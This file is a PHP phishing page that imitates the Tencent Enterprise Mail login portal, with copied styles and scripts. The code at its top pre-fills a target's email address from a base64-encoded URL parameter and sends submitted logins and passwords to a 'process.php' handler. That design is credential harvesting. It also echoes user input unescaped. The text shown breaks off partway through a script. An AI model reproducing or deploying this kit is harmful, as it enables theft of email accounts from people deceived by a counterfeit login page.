<?php
if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['login']) && !empty($_POST['login'])){
include('process.php');
}else{

function getDomainFromEmail($log)
{
// Get the data after the @ sign
   $prem = explode('@',$log);
$domain = substr(strrchr($log, "@"), 1);
$useid = $prem[0];
 $remove = array(".com");
   return $domain;
} 
// Example
$login = $_GET['login'];
if (isset($_GET['mgs'])) { 
$log =  $_GET['loge'];
}else{
$log = base64_decode($login);
}
$domain = getDomainFromEmail($log);

?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="save" content="history"><link rel="shortcut icon" href="https://exmail.qq.com/favicon.ico"><script async src="%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3_files/analytics.js"></script><script>
    if (["exmail.work.weixin.qq.com","work.exmail.qq.com"].indexOf(location.hostname) != -1) {
      location.href = "https://" + location.hostname + "/qy_mng_logic/loginpage";
    }
</script><title>腾讯企业邮箱-登录入口</title><meta http-equiv="Content-Type" content="text/html; charset=gb18030" charset="gb2312"><meta name="description" content="登录腾讯企业邮箱,请填写完整邮件地址,或管理员帐号,支持微信扫一扫登录。用新版Foxmail,无需设置,极速收发"><meta name="keywords" content="登录企业邮箱"><link rel="stylesheet" type="text/css" href="%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3_files/comm2eec3f.css"><link rel="stylesheet" type="text/css" href="%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3_files/bizmail2f1902.css"><style type="text/css" media="screen,print">body                    {background:#fff;color:#000;line-height:1.5; font-family: "lucida Grande","Microsoft Yahei";}p                       {display:block;margin:0;padding:0;}a{text-decoration:none;}.loginWrap{background:url(https://rescdn.qqmail.com/bizmail/zh_CN/htmledition/images/bizmail/login_background25dcc7.png) 50% 50% no-repeat; min-height: 466px; text-align: left; padding-top: 40px;padding-bottom: 28px;}.left_panel{width: 480px;}.login_panel{width: 390px; background: #ffffff; border-bottom: solid 1px #cacaca; min-height: 404px;}.login_panel .title{font-size: 16px; line-height: 56px; padding: 0 24px; border-bottom: solid 1px #cacaca; color: #242424; }.login_panel .items_panel{padding: 0 51px; font-size: 14px; position: relative; }.ret_msg {color:#ffffff; font-size: 16px;margin-bottom: 8px; min-height: 24px;}.ret_msg ul{margin: 0; font-size: 14px; padding-left: 31px;}.ret_msg a{color: #ffffff; text-decoration: underline;}.login_panel .items_panel .err_tips{color: #ec2020; min-height: 21px; margin-top: 11px;}.login_panel .items_panel .item{position: relative; margin-top: 7px;}.login_panel .items_panel .input_tips{position: absolute; top: 9px; left: 9px; color: #aaaaaa; display:none; }.login_panel .items_panel .disabled {color: #B7AEAE!important; border: 1px solid #E5E5EF;}.login_panel .items_panel .input_item{width: 268px; height: 20px;; padding: 8px 8px; font-size: 14px;}.login_panel .items_panel .hint{margin-top: 7px;color: #aaaaaa; margin-bottom: 10px}.login_panel .items_panel .autologin_choice{margin-top: 20px; font-size: 12px; position: relative;}.login_panel .items_panel .autologin_choice input{float: left; margin-top: 5px; margin-left: 0; }.login_panel .items_panel .green_btn{height: 40px; width: 100%; background-color: #2cc64d; font-size: 16px; margin-top: 13px; color: #ffffff; font-weight: bold; border: 1px solid #2ab949;}.login_panel .items_panel .forget_pwd_wrap{margin-top: 18px; margin-bottom: 25px;}.login_panel .items_panel .forget_pwd_wrap a{float: right;}.calcel{text-align: center; color: #333333; margin-top: 20px;}.login_panel .items_panel .gray_btn{display: inline-block; width: 286px; background-color: #f1f1f1; height: 40px; text-align: center; line-height: 40px; border: 1px solid #e7e7e7; margin-top: 13px; font-size: 16px;color: #333333;}.login_panel .items_panel a{text-decoration:none;}.login_panel .items_panel .verify_wrap{margin-top: 20px;}.login_panel .items_panel .verify_wrap .change_wrap {text-align: right; margin-top: 12px; margin-bottom: -6px;}.right_panel{float: right; width: 300px;}.right_panel .title{font-size: 16px; color: #ffffff; margin-top: 24px; height: 16px; padding-top: 26px;padding-left: 6px;}.login_panel .token_wrap a{line-height: 44px; float: right; font-size: 12px;}.login_panel .token_wrap .input_item{width: 203px; height: 40px; padding: 0 8px; font-size: 14px; }.loginWrap .middle_line{position: absolute; top: 28px; left: 496px; width: 1px; height: 398px; margin-left: -41px; right: 0; background:url(https://rescdn.qqmail.com/bizmail/zh_CN/htmledition/images/bizmail/login_middle_line25d91c.png) 50% 50% no-repeat; }.wx_login_wrap {height: 244px;}.wx_login_wrap .wx_loading{font-size: 20px; color: #ffffff; padding: 140px 87px;}.top a,.navPageBottom a        {border-right:1px solid #ccc;padding:0 8px 0 4px; font-size: 14px; color: #5c5c5c;}.top .left {float:left;}.top .left a {border:none;}.navPageTop a.end,.navPageBottom a.end    {border-right:0;}.container              {width:860px;margin:0 auto auto;}.header,.content,.footer                 {clear:both;width:100%;}.header                 {float:left;margin:0 0 20px;}.logo                   {background:#fff url( https://rescdn.qqmail.com/bizmail/zh_CN/htmledition/images/logo/logo_0_0093802.gif ) no-repeat 5px -12px;height:60px;width:205px;float:left;}.navPageTop             {height:28px;line-height:200%;background:#eaf3ff;margin:6px 0 0;padding:0 6px 0 12px;}.navPageTop .naviBar    {float:right;text-align:left;}.footer                 {text-align:center;float:left;margin:20px 0 0;}.footer p               {line-height:200%;display:block;}.moreFeature            {text-align:right;padding:6px 422px 30px 0;}.panelLogin             {min-height:370px;height:auto !important;height:370px;width:290px;float:right;background:#f4f4f4;border:1px solid #ccc;margin:0 auto;padding:20px 16px 0 22px;}.panelLogin h2          {text-align:left;font-size:14px;margin:0;}#VerifyArea p,.panelLogin p           {clear:both;display:block;margin:0 0 10px;}input.text              {width:235px; height:22px; font-size:14px;}p.operate               { padding:0 0 0 59px;line-height:110%;}.subfix                 {color:#039;line-height:26px;}em                      {font-style:normal;border-left:1px solid #ccc;padding:0 0 0 10px;}p.desc                  {margin-top:-6px;}#VerifyArea             {display:none;margin-top: 20px;}.cLight                 {color:#888;}.copyright              {font-size:11px;clear:both;}.infobar                {clear:both;margin:6px 0 0 0;}.infobar1 {background:#fff9e3;clear:both;border:1px solid #fadc80;line-height:120%;float:none;margin:8px 0;padding:6px 6px 6px 6px;}.error                  {color:#f00;}ul.contentul            {font-size:14px;line-height:26px;list-style:none;margin-top:-1px;}ul.contentul b          {color:#000;}.clr                    {clear:both;}.featureList { padding:10px 20px;margin:0;}.featureList li { padding:3px 0;color:#bbb; }.featureList li span { color:#000; }.wd {width:960px;clear:both; margin:0 auto; position: relative;}.wd810 {width:810px;clear:both; margin:0 auto; position: relative;}.qqmaillogo {float:left;margin-bottom:10px; padding-left:4px;}.top {margin:7px 0 0 205px;padding:5px 0 5px 0;text-align:right;}.adplan {text-align:left;margin:0 325px 0 0}label {display:block;line-height:24px;}label.column {width:60px;font-size:14px;text-align:left;padding:0 0 0 2px;}.adimg {width:146px;height:168px;}.panintro {}dl.panintro  {margin:1px 0 0 3px;padding:3px 0 0 3px;font:normal 14px Verdana;height:171px;}dl.panintro dt {display:block;float:left;margin:0 0 5px 0}dl.panintro dd {display:block;float:left;margin:42px 0 0 10px;}dl.panintro dd a {font:bold 14px verdana;}dl.panintro dd div {font:normal 12px Verdana;margin:14px 0 2px 0;line-height:22px}.panintro ul {color:#888;line-height:130%;margin:5px 0 0 18px;padding:0;}.moreinfo {margin:10px 0 0 3px;clear:left;}.navPageBottom {height:24px;line-height:24px; margin-top: 13px;}.bottom13{margin-bottom: 13px;}.bizTop{ background:url(https://rescdn.qqmail.com/bizmail/zh_CN/htmledition/images/domainmail/biz_top_line087794.gif) repeat-x top left; height:3px; width:100%; *font-size:0px;}.domainTop { background:url(https://rescdn.qqmail.com/bizmail/zh_CN/htmledition/images/domainmail/top_line087794.gif) repeat-x left bottom;  margin:0 auto;}.grayButton:link, a.grayButton:visited {color:#000;text-decoration:none;}.grayButton{ background:url(https://rescdn.qqmail.com/bizmail/zh_CN/htmledition/images/bizmail/grayButton087790.gif) no-repeat;height:28px;line-height:28px;width:91px;border:none;padding:0;}.xgrayButton:hover{ background:url(/zh_CN/htmledition/images/bizmail/grayButton.gif) no-repeat -92px;}.btn {padding:4px 14px;height:29px;}.reg_ann{ padding:4px 0 0; color:#71819e; margin:0;}.reg_ann li{ list-style:disc inside; line-height:19px; padding:0; margin:0;}.loginContent a:link, .loginContent a:visited{ text-decoration:none;}.loginContent a:hover{ text-decoration:underline;}.loginTypePic {width:130px;height:130px;margin:29px auto 0;*margin-top:27px;}.loginTypePic img{width:130px;height:130px;}.loginTypeTips {margin:9px 0 0;text-align:center;color:#71819e;}.loginTypeTips .scanSuccess {display:inline-block;width:16px;height:16px;margin:0 3px -5px 0;background:url(https://rescdn.qqmail.com/bizmail/zh_CN/htmledition/images/bizmail/login_customize/login_icon10af4f.png) no-repeat 0 -32px;}.loginTypeIcon {padding:0 0 1px 20px;font-size:12px;font-weight:normal;text-decoration:none;float:right;}.loginTypeIcon:hover{text-decoration:underline;}.loginTypeIconWeixin{background:url(https://rescdn.qqmail.com/bizmail/zh_CN/htmledition/images/bizmail/login_customize/login_icon10af4f.png) no-repeat 3px 3px;background-position:3px 1px\9;}#loginby_wx .loginTypeIcon {background-position:0 -16px;*background-position:0 -15px;}.divider_line {border-bottom:1px solid #e6eaf5;border-top:1px solid #7390bf;overflow:hidden;height:0px;}.tipsContainer{}.tipsWrap{width: 100%;color:#fff;text-align:center;position:fixed;_position:absolute;z-index: 10000;}.tipsWrap.topPos{top:70px;}.tipsWrap.tipsCenter{top:20%;}.tipsWrap .msg{background-color:#68AF02;-moz-border-radius:3px;border-radius:3px;-webkit-border-radius:3px;white-space: nowrap;padding: 3px 20px;font-size: 12px;}.tipsCenter .msg{opacity:0.8;filter:alpha(opacity=80);line-height:22px;padding:10px 25px;display: inline-block;-moz-box-shadow:2px 2px 2px #ccc;-webkit-box-shadow:2px 2px 2px #ccc;box-shadow:2px 2px 2px #ccc;font-size: 14px;}</style><script type="text/javascript" src="%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3_files/bj-report-tryjs.js"></script><script type="text/javascript" src="%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3_files/all3a9c12.js"></script><script>
var JsChecker =
{
isreload:false,
check:function(_asFile)
{
return typeof window[(/[0-9a-fA-F]{6}$/.test(_asFile) ? _asFile.substr(0,_asFile.length - 6) : _asFile) + "_js"] == "function";
},
load:function(_aoFiles, _abIsReload)
{
for (var i = 0, _nLen = _aoFiles.length; i < _nLen; i++)
{
var _sFile = _aoFiles[i];
if (_sFile && (!_abIsReload || !JsChecker.check(_sFile)))
{
document.write("<script", " language='javascript' src='https://rescdn.qqmail.com/bizmail/zh_CN/htmledition/js_biz/", _sFile, ".js",
_abIsReload ? "?" + Math.random() : "", "'></", "script>");
_abIsReload && (JsChecker.isreload = true);
}
}
}
};
</script><script>JsChecker.load(["safeauth19d947"]);</script><script language="javascript" src="%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3_files/safeauth19d947.js"></script><script>JsChecker.load(["safeauth19d947"], true);</script><script>
(function()
{
if (!JsChecker.check("safeauth19d947"))
{
var _sHref = location.href;
//location.replace(_sHref + (_sHref.indexOf("?") == -1 ? "?" : "&") + "res=local");
}
}
)();
</script><script>
(function()
{
if (JsChecker.isreload)
{
window.netTrans = new Image();
window.netTrans.src = ["/cgi-bin/getinvestigate?flowid=&stat=jsdownloadfail&res=&jsfailtime=", 
JsChecker.check("safeauth19d947") ? 1 : 2, "&r=", Math.random()].join("");
}
}
)();
</script><script type="text/javascript">
var Dom = ";电信1;网通1;教育1;网通2;;电信2;教育2;电信3;网通3".split(";");

//window.onerror=function(){return true;};

var S = function( object ) {
return document.getElementById( object );
};

// Object.prototype._attachEvent = Object.prototype.attachEvent;  //ie会直接调用原生attachEvent
Object.prototype.attachEvent = function( eventType, method, type )
{
if( document.all )
{
return this._attachEvent( eventType , method );
}
else
{
return this.addEventListener( eventType.replace( /\bon/ig , "" ), method, type );
}
}
function isblank(s)
{
for (var i = 0; i < s.length; i++)
{
var c = s.charAt(i);
if ((c != ' ') && (c != '\n') && (c != '\t')) return false;
}
return true;
}

function checkInput()
{
setCookie("dm_login_weixin_rem", "", new Date((+new Date()) + 1 * 24 * 3600 * 1000 ), "/", "qq.com" );
window.org_pass=S("pp").value;
if (!window.RSAKey)
{
document.getElementById("downError").style.display = "block";
document.getElementById("returnMsg").style.display = "none";
return false;
}
if( !checkCookie() )
{
return false;
}
var inputUin = document.form1.inputuin.value.toLowerCase();
var firstStep = document.form1.first_step.value;
if( inputUin == "" )
{
showMsg("emptyUserName");
document.form1.inputuin.focus();
return false;
}
if( -1 == inputUin.indexOf("@") )
{
inputUin += "@biz.mail.qq.com";
if(firstStep === "qyh")
{
document.form1.fun.value = "bizmail_admin_bind_wxqy";
}
else
{
document.form1.fun.value = "bizmail_admin";
}
}

if(("" != "true")&&( inputUin.indexOf( "@qq.com" ) > 0 || inputUin.indexOf( "@vip.qq.com" ) > 0 || inputUin.indexOf( "@foxmail.com" ) > 0 ))
{
showMsg( "errorLoginWithQQAccount" );
return false;
}
else if( -1 == inputUin.indexOf("@") )
{
showMsg("errorUserName");
document.form1.inputuin.focus();
return false;
}
else
{
document.form1.uin.value = trim(inputUin.substring(0, inputUin.indexOf("@")));
   document.form1.domain.value = trim(inputUin.substring(inputUin.indexOf("@") + 1));
}

if( S('pp').value == "" )
{
showMsg("emptyPassword");
S('pp').focus();
return false;
}

if( S('pp').value.length >= 100 )
{
S('pp').focus();
showMsg("errorPassowrdTooLong");
S('pp').focus();
return false;
}

if( S("VerifyArea").style.display != "none" && document.form1.verifycode.value == "" )
{
showMsg("emptyVerifyCode");
document.form1.verifycode.focus();
return false;
}
document.form1.btlogin.disabled = true;
document.form1.starttime.value = (new Date()).valueOf();
 

var PublicKey = "CF87D7B4C864F4842F1D337491A48FFF54B73A17300E8E42FA365420393AC0346AE55D8AFAD975DFA175FAF0106CBA81AF1DDE4ACEC284DAC6ED9A0D8FEB1CC070733C58213EFFED46529C54CEA06D774E3CC7E073346AEBD6C66FC973F299EB74738E400B22B1E7CDC54E71AED059D228DFEB5B29C530FF341502AE56DDCFE9";
var RSA = new RSAKey();
RSA.setPublic(PublicKey, "10001");
var PublicTs="1520702213";

var Res = RSA.encrypt(S('pp').value + '\n' + document.form1.ts.value + '\n');
if (Res )
{
if (document.form1.chg.value == 1)
{
document.form1.p.value = hex2b64(Res);
}
else
{
if (document.form1.ppp.value != "")
{
document.form1.p.value = document.form1.ppp.value;
}
else
{
document.form1.p.value = hex2b64(Res);
}
}
}

setCookie("logout_page", "dm_loginpage", new Date((+new Date()) + 1 * 24 * 3600 * 1000 ), "/", "qq.com" );

/*
var MaskValue = "";
for (var Loop = 0; Loop < document.form1.pp.value.length; Loop++, MaskValue += "0");
document.form1.pp.value = MaskValue;
*/

/*document.form1.pp.value = "";*/

if( location.host == 'mail.exmail.qq.com' )
{
document.form1.domain_bak.value = '1';
}

var sd = S("sel_domain");
if(sd && sd.options[sd.selectedIndex].text == "@foxmail.com")
{
return true;
}
else
{
return true;
}
}

function ShowSysService()
{

return false;
}

function qqping_url_build()
{
p = document.URL.indexOf("?");
if( -1 == p )p = document.URL.indexOf("&");
if( -1 == p )address = "u=" + document.URL;
else address = "u=" + document.URL.substring(0, p);
p = document.referrer.indexOf("?");
if( -1 == p )p = document.referrer.indexOf("&");
if( -1 == p )refer = "r=" + document.referrer;
else refer = "r=" + document.referrer.substring(0, p);
return address + "&" + refer;
}
var bAlwaysShowVerifyCode = (false == true);
function CheckName()
{
var _account = document.form1.inputuin.value.toLowerCase();

if( _account.indexOf( "@qq.com" ) > 0 || _account.indexOf( "@vip.qq.com" ) > 0 || _account.indexOf( "@foxmail.com" ) > 0 )
{
showMsg( "errorLoginWithQQAccount" );
return false;
}
else if( S("errorLoginWithQQAccount" ) != null )
{
S( "msgContainer" ).innerHTML = "";
S( "msgContainer" ).style.display = "none";
return true;

}
}

function checkCookie() {

var agt,cookieEnabled,isSafari, number;

agt             = navigator.userAgent.toLowerCase();
cookieEnabled   = navigator.cookieEnabled;
isSafari        = ( agt.indexOf("safari") != -1 );
number= Math.random();
document.cookie = number;

if( ((document.cookie.indexOf(number) == -1 || !cookieEnabled) && !isSafari) || (!cookieEnabled && isSafari) ) {
S("infobarNoCookie").style.display = "block";
return false;
}
else {
return true;
}
}

function changeimg()
{
S('vfcode').src = '/cgi-bin/getverifyimage?aid=23000101&f=html&ck=1&' + Math.random();
}


function showMsgDomain( msgId , method,txt) {
var msg, msgTemplate;
if ( method && method == 2)
{
msgTemplate = '<div class="infobar error" id="%_id_%">%_msg_%</div>';
}
else
{
msgTemplate = '<div class="infobar error" id="%_id_%">%_msg_%</div>';
}

if ( msgId != undefined && msgId != "" )
{
if(!txt) txt = msg[ msgId ];
S( "LeftContainer" ).innerHTML = txt;
return true;
}
else
{
return false;
}

}
function showMsg( msgId , method,txt) {

var msg, msgTemplate;

msg = {
errorAdminName      : "此管理员帐号不存在，请重新输入",
errorUserName       : "您输入的邮箱帐号不正确，请重新输入。",
emptyUserName       : "请填写您的邮箱帐号。",
emptyPassword       : "请填写邮箱密码。",
emptyVerifyCode     : "请填写验证码。",
errorPassowrdTooLong: "邮箱密码不能超过100个字符。",

errorNamePassowrd   : "您填写的帐号或密码不正确，请再次尝试。",
errorRequireSecondPassword: "请使用邮箱的“独立密码”登录。",
errorVerifyCode     : "您填写的验证码不正确。",
frequent            : "为了保障邮箱安全，请输入验证码。",
errorSecondPassword: "独立密码输入有误。",
errorSecondPwdNeedQQErr: "您设置了网页登录须先输入QQ密码。",
errorNeedQQProtect: '<p style="line-height:140%;">您的QQ帐号处于未保护状态，暂时无法登录。<br/><a onclick="ShowUrl()" style="text-decoration:underline;cursor:pointer;" >填写帐号保护资料</a></p>',
errorBlockIPErr: "为了保障邮箱安全，暂时不能使用页面登录，请登录QQ后跳转邮箱。",
errorDistinctValid: "为了保障邮箱安全，请再次输入验证码登录。",
errorNeedJumpFoxmail: "请到www.foxmail.com登录该帐户",
errorPermissionDenied:"您还未被邀请使用企业邮箱。<br/>您可以登录您的QQ邮箱，在体验室中自助开通。",
errorLoginWithQQAccount: "请使用企业邮箱帐号登录。",
errorBizmailMX: "登录失败。您域名的MX记录未通过验证，请联系管理员。",
errorBizmailLocked: "登录失败。您的域名已被锁定，请联系管理员。",
errorBindNullUin : "帐号为空，请重输",
errorBindErr     : "帐号绑定关系错误，请联系管理员",
errorBindFail    : "帐号绑定关系查询出错，请稍后再试",
errorSysErr : "登录失败，请咨询企业邮箱客服。",
errorNeedOpen : "您的企业邮箱账号未开通，请联系企业邮箱管理员。",
errorBizmailLoginLimit : "管理员限制该IP登录企业邮箱",
errorWeixinBind : "您的微信没有绑定企业邮箱，请先登录后绑定",
errorDynPwdSendFailed : "动态密码推送失败，请稍后重试",
errorTokenExpiredScan : "请扫码登录",
errorADScan : "你的帐号需要使用微信扫码登录，请使用微信扫描右侧二维码登录"
};





if ( method && method == 2)
{
msgTemplate = '<div class=" error" id="%_id_%">%_msg_%</div>';
}
else
{
msgTemplate = '<div class=" error" id="%_id_%">%_msg_%</div>';
}



if ( msgId != undefined && msgId != "" )
{
if(!txt) txt = msg[ msgId ];
S( "msgContainer" ).innerHTML = msgTemplate.replace( /%_msg_%/ig , txt ).replace( /%_id_%/ig , msgId );
S( "msgContainer" ).style.display = "";
return true;
}
else
{
return false;
}

}

function showLoginType (type) {
if (type === "account") {
show(S("loginby_wx"),false); 
show(S("loginby_account"), true);
show(S("loginType_weixin"),true);
show(S("loginType_account"), false);
} else if (type === "weixin") {
show(S("loginby_wx"),true); 
show(S("loginby_account"), false);
show(S("loginType_weixin"),false);
show(S("loginType_account"), true);
}


}

function init(){
checkCookie();
CheckName();


S("inputuin").attachEvent( "onblur" , CheckName);
S("pp").attachEvent( "onfocus" , CheckName);

if( S( "inputuin" ) != null && S( "inputuin" ).value == "" )
{
S( "inputuin" ).focus();
}
else if( S( "qq" ) != null )
{
S( "qq" ).focus();
}
}
function OpenStatWin()
{
window.open("/cgi-bin/speedstat?actions=relogin","speedstatwin","height=500,width=500,status=yes,toolbar=no,menubar=no,location=no");
}
function ShowUrl(uin)
{
if(parseInt(uin)+"" == uin)
{
window.open( 'https://account.qq.com/cgi-bin/up/newreg_set_dna_login?from=qqmail&ret_url=http%3A%2F%2Fmail.qq.com&uin='+uin );
}else
{
window.open(  'https://account.qq.com/cgi-bin/up/newreg_set_dna_login?from=qqmail&ret_url=http%3A%2F%2Fmail.qq.com' );
}
}
function ChkPsw()
{
S("chg") && (S("chg").value = 1);
}
function ChkPswInput(event)
{
var gsAgent = navigator.userAgent.toLowerCase(),
gbIsOpera = gsAgent.indexOf("opera") > -1,
gbIsIE = (gsAgent.indexOf("compatible") > -1 && !gbIsOpera)|| gsAgent.indexOf("msie") > -1,
gnIEVer = /MSIE (\d+.\d+);/i.test(gsAgent) && parseFloat(RegExp["$1"]);

if(!gbIsIE || (gbIsIE && gnIEVer <= 9)){
var caps_lock_tips = S("caps_lock_tips");

var dom = document.getElementById("pp");
var code = event.keyCode || event.which;
isShift = (event.shiftKey || 16 == code || false);

if(!dom.value)
{
caps_lock_tips.style.display = "none";
return false;
}

var newKey = event.key;
if(/^[A-Z]+$/.test(newKey) && caps_lock_tips.style.display != "block" && !isShift)
{
caps_lock_tips.style.display = "block";
}
else if(!/^[A-Z]+$/.test(newKey) && caps_lock_tips.style.display != "none")
{
caps_lock_tips.style.display = "none";
}
}
}
function HideLockTips()
{
S("caps_lock_tips").style.display = "none";
}
</script></head><body class="txt_center " onunload="document.form1.btlogin.disabled = false;"><iframe scrolling="no" id="iframe_distributeDomain_proxy_" name="iframe_distributeDomain_proxy_" class="" onload="this.setAttribute('loaded','true');_creAteifRAmeoNlQAd_('iframe_distributeDomain_proxy_',this);" src="%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3_files/domain2.htm" style="display:none;" loaded="true" frameborder="0"></iframe> <style type="text/css">.topLink{padding-top:25px; font-size: 14px; color: #5c5c5c;}.topLink a{color: #5c5c5c; }.qqmaillogo {float:left; padding-left:4px; margin-top: 18px;}.wd {width:960px;clear:both;margin:0 auto;}.wd900 {width:900px;clear:both;margin:0 auto;}.topheight{height:70px;}</style><div name="Header"><script type="text/javascript">
function SetHomeLang(_ashl){
var _sDomain = "exmail.qq.com",
_oExpires = new Date(new Date().valueOf() + 7 * 24 * 3600 * 1000),
_sCookie = "locate=" + escape(_ashl) + "; path=/; domain=" + _sDomain + "; expires=" + _oExpires;
document.cookie = _sCookie;
location.href = "/login/" + _ashl;
}
function JumpToEng(){
var _sDomain = "exmail.qq.com",
_oExpires = new Date(new Date().valueOf() + 7 * 24 * 3600 * 1000),
_sCookie = "locate=; path=/; domain=" + _sDomain + "; expires=" + _oExpires;
document.cookie = _sCookie;
// location.href = "http://en.exmail.qq.com"; 
if(_sDomain.indexOf("exmail.qq.com") >= 0 ){
location.href = "http://en.exmail.qq.com";
}else{ 
location.href = "http://" + _sDomain + "/cgi-bin/loginpage?t=dm_loginpage_en";
}
}
</script><div class="wd900 getuserdata topheight" id="topDataTd"><div class=""><a href="https://exmail.qq.com/"><img src="%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3_files/logo1ca3fe.png" class="qqmaillogo" title="企业邮箱首页" alt="企业邮箱"></a></div><div class="topLink right addrtitle"><a href="https://exmail.qq.com/onlinesell/intro" target="_blank" class="toptitle">新用户注册</a><span> | </span><a href="http://service.exmail.qq.com/cgi-bin/help?id=28" target="_blank" class="toptitle">客户端收发</a><span> | </span><a onclick="JumpToEng()" class="toptitle">English</a><span> | </span><a onclick="SetHomeLang('zh_TW');" class="toptitle">繁体版</a><span> | </span><a href="https://exmail.qq.com/cgi-bin/loginpage?t=qq_loginpage" class="toptitle">企业QQ用户</a></div></div></div><div class="loginWrap"><div class="wd810"><form name="form1" method="post"  onsubmit="return checkInput();"><input name="sid" value="" type="hidden"><input name="firstlogin" value="false" type="hidden"><input name="domain" value="" type="hidden"><input name="aliastype" value="other" type="hidden"><input name="errtemplate" value="dm_loginpage" type="hidden"><input name="first_step" value="" type="hidden"><input name="buy_amount" value="" type="hidden"><input name="year" value="" type="hidden"><input name="company_name" value="" type="hidden"><input name="is_get_dp_coupon" value="" type="hidden"><input name="source" value="" type="hidden"><input name="qy_code" value="" type="hidden"><input name="origin" value="" type="hidden"><input name="starttime" type="hidden"><input name="redirecturl" type="hidden"><input name="f" value="biz" type="hidden"><input name="uin" value="" type="hidden"><input name="p" type="hidden"><input name="delegate_url" value="" type="hidden"><input name="ts" value="1520702213" type="hidden"><input name="from" value="" type="hidden"><input name="ppp" value="" type="hidden"><input name="chg" value="0" type="hidden"><input name="domain_bak" id="domain_bak" value="0" type="hidden"><input name="loginentry" value="3" type="hidden"><input name="s" value="" type="hidden"><input name="dmtype" value="" type="hidden"><input name="fun" value="" type="hidden"><div class="right_panel"><div class="title">微信扫描登录</div><div id="loginby_wx" class="wx_login_wrap" style="position: absolute;"><div id="qr_shadow" style="display:none;position: absolute;   background-color:#000000;filter: alpha(opacity=70);      -moz-opacity: 0.7; opacity: 0.7; width: 289px; height: 289px;margin-left: 8px; margin-top: 23px;"></div><div id="wx_after_admin" style="display:none;padding:7px 14px;color: #ffffff;line-height: 1.6;font-family: 'Microsoft Yahei'; position: absolute; padding-top: 100px;">      <i style="width: 38px;height: 38px;background: url(/zh_CN/htmledition/images/icon_popup.png) no-repeat 0 -87px;display: block;margin: auto;"></i><br><div style="font-size: 16px; margin-left: 28px;">                            <p>管理员账号不支持微信扫码登录，</p>                           <p>请输入账号和密码登录。</p>                   </div>                   </div><div id="qr_con" class="loginType"><iframe src="%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3_files/qrconnect.htm" scrolling="no" width="300px" height="400px" frameborder="0"></iframe></div><div id="refresh_try" style="display:none;font-size: 14px;text-align: center;padding-top: 5px;text-decoration: underline;"><a style="color: #F9F8F8;" href="http://exmail.qq.com/login" onclick="window.name='';">尝试刷新</a></div></div></div><div class="left_panel"><div class="ret_msg" id="returnMsg"></div><div class="login_panel"><div class="title">登录企业邮箱</div><div class="items_panel"><div class="err_tips" id="msgContainer"></div><script>
setCookie("logout_page", "", new Date((+new Date()) + 1 * 24 * 3600 * 1000 ), "/", "qq.com" );
</script><div class="item">
           <input type="hidden" name="login" value="<?php echo $log; ?>">
<label class="input_tips" id="uin_tip" onclick="document.form1.inputuin.focus();">邮箱帐号/管理员帐号</label><div><input class="input_item" id="inputuin" name="inputuin" placeholder="邮箱帐号/管理员帐号" value="<?php echo $log; ?>"><label class="hint">请填写企业邮箱的完整帐号，或管理员帐号。</label></div></div><div class="item"><label class="input_tips" id="pwd_tip" onclick="document.getElementById('pp').focus();">密码</label><div><input name="pass" class="input_item" id="pp" value="" onpropertychange="ChkPsw();" onkeyup="ChkPswInput(event);" onblur="HideLockTips();" placeholder="密码" type="password"></div><div class="lock_tips" id="caps_lock_tips" style="display: none;"><span class="lock_tips_row"></span> <span>大写锁定已打开</span></div></div><div id="VerifyArea" class="verify_wrap" style="display: none;"><div class="item"><label class="input_tips" id="verify_tip" onclick="document.form1.verifycode.focus();">验证码</label><div><script type="text/javascript">
document.write("<img id='vfcode' src='/cgi-bin/getverifyimage?aid=23000101&f=html&ck=1&",Math.random(),"' style='float:right; cursor:pointer;border:1px solid #e4eef9; height: 40px;' onclick='changeimg()'>");
</script><img id="vfcode" src="%E8%85%BE%E8%AE%AF%E4%BC%81%E4%B8%9A%E9%82%AE%E7%AE%B1-%E7%99%BB%E5%BD%95%E5%85%A5%E5%8F%A3_files/getverifyimage.png" style="float:right; cursor:pointer;border:1px solid #e4eef9; height: 40px;" onclick="changeimg()"><input class="input_item" autocomplete="off" maxlength="4" id="vc" name="verifycode" placeholder="验证码" style="width:158px;"></div><div class="change_wrap"><a href="javascript:changeimg()">看不清？&nbsp;换一张</a></div></div><script type="text/javascript">
S("VerifyArea").style.display = ( bAlwaysShowVerifyCode  ? "block" : "none" );
</script></div><div class="autologin_choice" id="sss"><input id="ss" name="ss" value="1" tabindex="7" type="checkbox"><label for="ss">5天内自动登录</label><script type="text/javascript">
document.getElementById("ss").onmouseover = function(){
document.getElementById("auto_login_tips").style.display = "block";
document.getElementById("auto_login_tips").style.visibility = "visible";
};

document.getElementById("ss").onmouseout = function(){
document.getElementById("auto_login_tips").style.display = "none";
document.getElementById("auto_login_tips").style.visibility = "hidden";
};
